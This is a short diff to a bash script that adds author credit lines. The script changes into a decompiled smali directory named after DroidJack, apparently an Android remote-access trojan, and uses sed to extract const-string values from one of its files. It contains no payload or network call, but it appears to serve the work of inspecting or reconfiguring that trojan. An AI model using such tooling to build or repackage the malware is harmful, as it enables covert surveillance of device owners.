@@ -1,4 +1,7 @@
 #!/bin/env bash
+#Coded By Djawed Hammadi
+#FACEBOOK:www.facebook.com/djawedx23
+#Copyright@2020
 cd ..
 dromalaf= cd xline/smali/net/droidjack/server
 sed 's+    const-string v0, +'@'+g' br.smali > djawed.txt
